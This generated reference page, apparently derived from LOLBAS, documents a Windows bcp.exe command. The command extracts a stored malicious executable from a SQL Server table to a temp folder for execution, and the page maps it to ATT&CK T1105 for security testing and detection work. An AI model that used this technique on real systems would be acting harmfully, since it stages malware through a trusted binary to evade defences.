---
parsed_by: focuslocust
source: commands
type: generated
---
# Bcp Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Bcp.exe

Tool page: [Bcp.exe](../../tools/windows/bcp.exe.md)

### Extract malicious executable from database storage to local file system for execution.

```text
bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
```

Description:

Export binary payload stored in SQL Server database to file system.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Bcp.yml` |
| Evidence | Command preserved from source parser. |
